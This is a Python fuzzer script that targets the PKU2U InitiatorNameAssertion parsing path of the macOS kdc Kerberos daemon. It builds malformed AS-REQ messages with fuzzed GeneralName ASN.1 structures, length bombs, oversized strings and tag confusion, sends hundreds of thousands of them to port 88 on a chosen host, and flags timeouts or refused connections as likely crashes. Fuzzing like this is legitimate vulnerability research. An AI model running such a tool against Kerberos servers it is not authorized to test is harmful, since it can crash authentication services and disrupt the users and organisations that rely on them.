#!/usr/bin/env python3
"""
fuzz_kdc_pku2u.py — Targeted PKU2U InitiatorNameAssertion fuzzer for macOS kdc

Attack surface: __kdc_as_rep Stage 4 (PKU2U path)
  When AS-REQ realm == "WELLKNOWN:PKU2U", kdc:
    1. Finds padata type 148 (PA-PKU2U-NAME = 0x94)
    2. Calls decode_InitiatorNameAssertion(padata_blob)
    3. If discriminant == 2 (nameNotInCert):
         length_GeneralName() → malloc() → encode_GeneralName() → base64_encode()

  The length_GeneralName/encode_GeneralName/base64_encode chain on
  attacker-controlled ASN.1 is the target.  The prior fuzzer (fuzz_kdc.py)
  never produced a PKU2U realm, so this path was never exercised.

InitiatorNameAssertion ::= CHOICE {
    nameInCert    [0] GeneralName,   -- discriminant 0
    anonymous     [1] NULL,          -- discriminant 1
    nameNotInCert [2] GeneralName    -- discriminant 2 → GeneralName re-encode path
}

GeneralName ::= CHOICE {
    otherName                 [0] OtherName,
    rfc822Name                [1] IA5String,
    dNSName                   [2] IA5String,
    x400Address               [3] ANY,
    directoryName             [4] Name,
    ediPartyName              [5] ANY,
    uniformResourceIdentifier [6] IA5String,
    iPAddress                 [7] OCTET STRING,
    registeredID              [8] OID
}

Usage:
    python3 fuzz_kdc_pku2u.py --host 192.168.64.2 [--iters N] [--delay F] [-v]
"""

import socket, struct, random, time, os, sys, argparse, signal

# ──────────────────────────────────────────────────────────────────────────────
# DER primitives (same helpers as fuzz_kdc.py)
# ──────────────────────────────────────────────────────────────────────────────

def _der_len(n):
    if n < 0x80:   return bytes([n])
    if n < 0x100:  return bytes([0x81, n])
    if n < 0x10000:return bytes([0x82, n >> 8, n & 0xFF])
    return bytes([0x83, (n>>16)&0xFF, (n>>8)&0xFF, n&0xFF])

def _tlv(tag, value):
    if isinstance(value, str): value = value.encode()
    return bytes([tag]) + _der_len(len(value)) + value

def _seq(v):       return _tlv(0x30, v)
def _ctx(n, v):    return _tlv(0xA0 | n, v)       # [n] EXPLICIT constructed
def _ctx_i(n, v):  return _tlv(0x80 | n, v)       # [n] IMPLICIT primitive
def _int(n):
    if n == 0: return _tlv(0x02, b'\x00')
    b = abs(n).to_bytes((abs(n).bit_length()+8)//8,'big').lstrip(b'\x00') or b'\x00'
    if n < 0: b = bytes([(~b[0]+1)&0xFF]) + b[1:]
    return _tlv(0x02, b)
def _ia5(s):       return _tlv(0x16, s if isinstance(s,bytes) else s.encode('ascii','replace'))
def _oid(raw):     return _tlv(0x06, raw)
def _oct(b):       return _tlv(0x04, b)
def _null():       return b'\x05\x00'
def _bstr(b):      return _tlv(0x03, b'\x00' + b)
def _gs(s):        return _tlv(0x1B, s if isinstance(s,bytes) else s.encode())

def _kdc_options(flags=0x40810010):  # forwardable+renewable+canonicalize+PKU2U flag
    return _tlv(0x03, b'\x00' + struct.pack('>I', flags))

def _kerberos_time(t=b'20370913024805Z'):
    return _tlv(0x18, t)

def _principal_name(ntype, names):
    return _seq(_ctx(0, _int(ntype)) + _ctx(1, _seq(b''.join(_gs(n) for n in names))))

def _build_as_req(cname, realm, sname_parts, enctypes, pa_data_blobs):
    """Build a Kerberos AS-REQ DER blob."""
    pa = b''.join(
        _seq(_ctx(1, _int(ptype)) + _ctx(2, _oct(pval)))
        for ptype, pval in pa_data_blobs
    )
    req_body = _seq(
        _ctx(0, _kdc_options()) +
        _ctx(1, _principal_name(1, [cname])) +
        _ctx(2, _gs(realm)) +
        _ctx(3, _principal_name(2, sname_parts)) +
        _ctx(5, _kerberos_time()) +
        _ctx(7, _kerberos_time(b'20370913024805Z')) +
        _ctx(8, _int(random.randint(0, 0x7FFFFFFF))) +
        _ctx(9, _seq(b''.join(_int(e) for e in enctypes)))
    )
    msg = _seq(
        _ctx(1, _int(5)) +
        _ctx(2, _int(10)) +
        _ctx(3, _seq(pa)) +
        _ctx(4, req_body)
    )
    return _tlv(0x6a, msg)  # APPLICATION 10 = AS-REQ

def _krb_tcp_frame(data):
    return struct.pack('>I', len(data)) + data


# ──────────────────────────────────────────────────────────────────────────────
# GeneralName builders
# ──────────────────────────────────────────────────────────────────────────────

# OtherName OIDs (KRB5 principal, UPN, SAN, random)
_KNOWN_OIDS = [
    bytes([0x2b, 0x06, 0x01, 0x05, 0x02, 0x02]),          # id-pkinit-san
    bytes([0x2b, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x14, 0x02, 0x03]),  # UPN (MS)
    bytes([0x55, 0x04, 0x03]),                              # CN
    bytes([0x60, 0x86, 0x48, 0x01, 0x86, 0xf8, 0x42, 0x01, 0x01]),  # Apple
    bytes([0x00]),                                          # minimal
    bytes([0xff] * 32),                                     # invalid / long
    b'',                                                    # empty
]

_INTERESTING_BYTES = [0, 1, 0x7F, 0x80, 0xFF, 0x40, 0x3F]
_INTERESTING_SIZES = [0, 1, 2, 3, 4, 7, 8, 15, 16, 127, 128, 255, 256, 512, 1024, 0xFFFF]

def _rand_oid(rng):
    if rng.random() < 0.4:
        return rng.choice(_KNOWN_OIDS)
    # random OID bytes (may be structurally invalid)
    length = rng.choice([1, 4, 16, 128, 255])
    return bytes([rng.randint(0x20, 0x7f) for _ in range(length)])

def build_other_name(rng):
    """[0] OtherName ::= SEQUENCE { type-id OID, value [0] EXPLICIT ANY }"""
    oid = _rand_oid(rng)
    strat = rng.randint(0, 6)
    if strat == 0:
        val_data = os.urandom(rng.choice(_INTERESTING_SIZES[:10]))
    elif strat == 1:
        val_data = b'\x00' * rng.choice([0, 1, 128, 256])
    elif strat == 2:
        val_data = b'\xff' * rng.choice([0, 1, 128, 256])
    elif strat == 3:
        # nested OID inside the value
        val_data = _oid(_rand_oid(rng))
    elif strat == 4:
        # claim huge length, provide nothing
        claimed = rng.choice([0xFFFF, 0x7FFFFFFF, 0xFFFFFFFF])
        val_data = _der_len(claimed)  # length bytes only, no content
    elif strat == 5:
        # KRB5 PrincipalName blob
        val_data = _seq(_ctx(0, _int(1)) + _ctx(1, _seq(_gs('fuzz@PKU2U'))))
    else:
        val_data = os.urandom(rng.randint(0, 512))

    inner = _oid(oid) + _ctx(0, val_data)
    return _ctx(0, _seq(inner))  # [0] IMPLICIT → tag 0xA0 for otherName

def build_rfc822_name(rng):
    """[1] IA5String = email address"""
    strat = rng.randint(0, 5)
    if strat == 0:   s = b'fuzz@pku2u.local'
    elif strat == 1: s = b'A' * rng.choice([128, 256, 512, 4096])
    elif strat == 2: s = os.urandom(rng.choice([16, 128, 512]))
    elif strat == 3: s = b'\x00' * rng.choice([0, 1, 128])
    elif strat == 4: s = b'\xff' * rng.choice([0, 4, 255])
    else:            s = b''
    return _tlv(0x81, s)  # [1] IMPLICIT IA5String

def build_dns_name(rng):
    """[2] IA5String = DNS name"""
    strat = rng.randint(0, 4)
    if strat == 0:   s = b'pku2u.local'
    elif strat == 1: s = b'A.' * rng.choice([64, 128]) + b'com'
    elif strat == 2: s = os.urandom(rng.choice([16, 512, 4096]))
    elif strat == 3: s = b'\x00' + b'.' + b'\xff'
    else:            s = b''
    return _tlv(0x82, s)  # [2] IMPLICIT IA5String

def build_directory_name(rng):
    """[4] Name = X.500 Distinguished Name"""
    cn_bytes = os.urandom(rng.choice([4, 64, 512])) if rng.random() < 0.5 else b'PKU2U Fuzz'
    rdn = _seq(_seq(_oid(bytes([0x55, 0x04, 0x03])) + _gs(cn_bytes)))
    inner = _seq(rdn)
    return _ctx(4, inner)  # [4] EXPLICIT (directoryName is EXPLICIT in GeneralName)

def build_uri(rng):
    """[6] IA5String = URI"""
    strat = rng.randint(0, 3)
    if strat == 0:   s = b'pku2u://fuzz'
    elif strat == 1: s = b'A' * rng.choice([256, 4096])
    elif strat == 2: s = b'\x00' * rng.choice([0, 128])
    else:            s = os.urandom(rng.choice([16, 512]))
    return _tlv(0x86, s)  # [6] IMPLICIT IA5String

def build_ip_address(rng):
    """[7] OCTET STRING = 4 or 16 bytes"""
    strat = rng.randint(0, 4)
    if strat == 0:   b = b'\x7f\x00\x00\x01'          # 127.0.0.1
    elif strat == 1: b = os.urandom(4)
    elif strat == 2: b = os.urandom(16)                # IPv6
    elif strat == 3: b = b'\xff' * rng.choice([0, 1, 4, 16, 256])
    else:            b = os.urandom(rng.choice([0, 3, 5, 17, 255]))  # invalid lengths
    return _tlv(0x87, b)  # [7] IMPLICIT OCTET STRING

def build_registered_id(rng):
    """[8] OID"""
    return _tlv(0x88, _rand_oid(rng))  # [8] IMPLICIT OID

_GENERAL_NAME_BUILDERS = [
    build_other_name,
    build_rfc822_name,
    build_dns_name,
    build_directory_name,
    build_uri,
    build_ip_address,
    build_registered_id,
]

def build_general_name(rng):
    """Build a fuzzed GeneralName DER blob."""
    builder = rng.choice(_GENERAL_NAME_BUILDERS)
    return builder(rng)

def build_malformed_general_name(rng):
    """Build a structurally invalid GeneralName."""
    strat = rng.randint(0, 7)
    if strat == 0:
        # Unknown tag (outside 0-8 range for GeneralName)
        return _tlv(rng.choice([0x89, 0x9F, 0xBF, 0xFF, 0x00]), os.urandom(rng.randint(0, 64)))
    elif strat == 1:
        # Zero-length GeneralName
        return b''
    elif strat == 2:
        # Length claim >> actual content
        claimed = rng.choice([0x80, 0xFF, 0xFFFF])
        actual = os.urandom(rng.randint(0, 8))
        return bytes([0x82]) + bytes([0x82, claimed >> 8, claimed & 0xFF]) + actual
    elif strat == 3:
        # Raw random bytes
        return os.urandom(rng.choice([1, 4, 32, 256, 1024]))
    elif strat == 4:
        # All zeros
        return b'\x00' * rng.choice([1, 4, 128])
    elif strat == 5:
        # All 0xFF
        return b'\xff' * rng.choice([1, 4, 128])
    elif strat == 6:
        # Nested: GeneralName inside GeneralName
        inner = build_general_name(rng)
        return _ctx(0, _seq(_oid(bytes([0x55, 0x04, 0x03])) + _ctx(0, inner)))
    else:
        # Length bomb: [3] with 0xFFFFFF claimed length
        return bytes([0x83, 0xFF, 0xFF, 0xFF]) + os.urandom(4)


# ──────────────────────────────────────────────────────────────────────────────
# InitiatorNameAssertion builder
# ──────────────────────────────────────────────────────────────────────────────

def build_initiator_name_assertion(rng):
    """
    InitiatorNameAssertion ::= CHOICE {
        nameInCert    [0] GeneralName,   -- disc=0
        anonymous     [1] NULL,          -- disc=1
        nameNotInCert [2] GeneralName    -- disc=2 → hits length/encode/base64 chain
    }

    Strategies:
      A. Valid [2] (nameNotInCert) + fuzzed GeneralName  ← primary target
      B. Valid [0] (nameInCert) + fuzzed GeneralName
      C. [1] NULL (anonymous path)
      D. Unknown discriminant (> 2)
      E. Structurally invalid: raw bytes, length bombs, tag confusion
      F. Multiple concatenated CHOICEs (parser confusion)
    """
    strat = rng.randint(0, 15)

    if strat <= 5:
        # Strategy A: nameNotInCert [2] — primary fuzz surface
        gn = build_general_name(rng) if rng.random() < 0.7 else build_malformed_general_name(rng)
        return _tlv(0xA2, gn)  # [2] EXPLICIT constructed

    elif strat == 6:
        # Strategy A variant: [2] with length claim > actual content
        gn = build_general_name(rng)
        claimed = len(gn) + rng.choice([1, 128, 0xFFFF])
        return bytes([0xA2]) + _der_len(claimed) + gn

    elif strat == 7:
        # Strategy A variant: [2] wrapping multiple concatenated GeneralNames
        count = rng.randint(2, 5)
        gns = b''.join(build_general_name(rng) for _ in range(count))
        return _tlv(0xA2, gns)

    elif strat == 8:
        # Strategy B: nameInCert [0]
        gn = build_general_name(rng)
        return _tlv(0xA0, gn)

    elif strat == 9:
        # Strategy C: anonymous [1] NULL
        return _tlv(0xA1, _null())

    elif strat == 10:
        # Strategy D: unknown discriminant [3]-[9]
        tag = rng.randint(3, 9)
        gn = build_general_name(rng)
        return _tlv(0xA0 | tag, gn)

    elif strat == 11:
        # Strategy E: raw garbage
        return os.urandom(rng.choice([1, 4, 16, 256, 1024, 4096]))

    elif strat == 12:
        # Strategy E: length bomb at top level
        inner = os.urandom(rng.randint(0, 16))
        claimed = rng.choice([0xFFFF, 0x7FFFFFFF, 0xFFFFFFFF])
        return bytes([0xA2]) + _der_len(claimed) + inner

    elif strat == 13:
        # Strategy E: empty
        return b''

    elif strat == 14:
        # Strategy F: two CHOICEs concatenated (CHOICE shouldn't allow this)
        a = _tlv(0xA2, build_general_name(rng))
        b_ = _tlv(0xA0, build_general_name(rng))
        return a + b_

    else:
        # Strategy E: valid outer tag but SEQUENCE instead of CHOICE inside
        inner = _seq(_int(2) + build_general_name(rng))
        return _tlv(0xA2, inner)


# ──────────────────────────────────────────────────────────────────────────────
# Full AS-REQ with PKU2U realm
# ──────────────────────────────────────────────────────────────────────────────

_REALM = 'WELLKNOWN:PKU2U'
_ENCTYPES = [17, 18, 23, -133, -128]

def gen_pku2u_as_req(rng):
    """Build a PKU2U AS-REQ — routes to __kdc_as_rep Stage 4."""
    ina_blob = build_initiator_name_assertion(rng)

    # Primary padata: PA-PKU2U-NAME (148 = 0x94)
    padata = [(148, ina_blob)]

    # Occasionally add noise padata alongside
    if rng.random() < 0.3:
        extra_type = rng.choice([1, 2, 11, 16, 19, 149, 255])
        extra_val  = os.urandom(rng.choice([0, 4, 64, 256]))
        padata.append((extra_type, extra_val))

    # cname mutations
    cname_strat = rng.randint(0, 4)
    if cname_strat == 0:   cname = 'fuzz'
    elif cname_strat == 1: cname = 'A' * rng.choice([64, 256, 512])
    elif cname_strat == 2: cname = ''
    elif cname_strat == 3: cname = 'user@' + 'B' * 128
    else:                  cname = os.urandom(16).hex()

    # sname mutations
    sname_strat = rng.randint(0, 3)
    if sname_strat == 0:   sname = ['krbtgt', _REALM]
    elif sname_strat == 1: sname = ['krbtgt']
    elif sname_strat == 2: sname = ['A' * 256, _REALM]
    else:                  sname = ['krbtgt', 'X' * 512]

    # realm mutations — mostly valid PKU2U, sometimes not
    if rng.random() < 0.85:
        realm = _REALM
    else:
        realm = rng.choice([
            'WELLKNOWN:PKU2U\x00extra',   # null byte
            'WELLKNOWN:PKU2' + 'U' * 256, # long
            'WELLKNOWN:PKU2U' + '\xff',   # high byte
            'wellknown:pku2u',            # lowercase (case sensitivity)
        ])

    enctypes = [rng.choice(_ENCTYPES) for _ in range(rng.randint(1, 5))]

    return _build_as_req(cname, realm, sname, enctypes, padata)


# ──────────────────────────────────────────────────────────────────────────────
# Main loop
# ──────────────────────────────────────────────────────────────────────────────

def main():
    ap = argparse.ArgumentParser(description='PKU2U InitiatorNameAssertion fuzzer for macOS kdc')
    ap.add_argument('--host',    default='127.0.0.1')
    ap.add_argument('--port',    type=int, default=88)
    ap.add_argument('--iters',   type=int, default=500000)
    ap.add_argument('--seed',    type=int, default=None)
    ap.add_argument('--delay',   type=float, default=0.0)
    ap.add_argument('--timeout', type=float, default=3.0)
    ap.add_argument('-v', '--verbose', action='store_true')
    args = ap.parse_args()

    rng = random.Random(args.seed)
    t0  = time.time()
    errors = crashes_hinted = responses = 0
    i = 0

    print(f'[*] PKU2U InitiatorNameAssertion fuzzer')
    print(f'[*] Target:  {args.host}:{args.port}  (kdc)')
    print(f'[*] Surface: decode_InitiatorNameAssertion → length_GeneralName → malloc → encode_GeneralName → base64')
    print(f'[*] Iters:   {args.iters}  Seed: {args.seed}')
    print(f'[*] Monitor: sudo log stream --predicate \'process == "kdc"\' on target')
    print()

    def _sig(s, f):
        elapsed = time.time() - t0
        print(f'\n[*] Stopped at iter {i}. responses={responses} errors={errors} '
              f'crashes_hinted={crashes_hinted} rate={i/max(elapsed,1):.1f}/s')
        sys.exit(0)
    signal.signal(signal.SIGINT, _sig)

    for i in range(1, args.iters + 1):
        try:
            payload = gen_pku2u_as_req(rng)
            framed  = _krb_tcp_frame(payload)

            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(args.timeout)
            s.connect((args.host, args.port))
            s.sendall(framed)
            try:
                resp = s.recv(4096)
                responses += 1
                if args.verbose:
                    print(f'  [{i:6d}] sent={len(framed)}B recv={len(resp)}B ina_len={len(payload)}')
            except socket.timeout:
                # Timeout may indicate kdc hung or is processing slowly
                crashes_hinted += 1
                if args.verbose:
                    print(f'  [{i:6d}] TIMEOUT sent={len(framed)}B')
            s.close()

        except ConnectionRefusedError:
            errors += 1
            crashes_hinted += 1
            print(f'  [{i:6d}] CONNECTION REFUSED — kdc may have crashed!')
            time.sleep(2.0)  # wait for potential restart
        except Exception as e:
            errors += 1
            if args.verbose:
                print(f'  [{i:6d}] error: {e}')

        if i % 500 == 0:
            elapsed = time.time() - t0
            print(f'[{i:7d}/{args.iters}] {i/max(elapsed,1):5.0f}/s  '
                  f'responses={responses}  errors={errors}  crashes_hinted={crashes_hinted}',
                  flush=True)

        if args.delay:
            time.sleep(args.delay)

    elapsed = time.time() - t0
    print(f'\n[*] Done. {i} iters in {elapsed:.1f}s ({i/max(elapsed,1):.1f}/s)')
    print(f'[*] responses={responses}  errors={errors}  crashes_hinted={crashes_hinted}')
    print(f'[*] Check: ls ~/Library/Logs/DiagnosticReports/ on target')


if __name__ == '__main__':
    main()
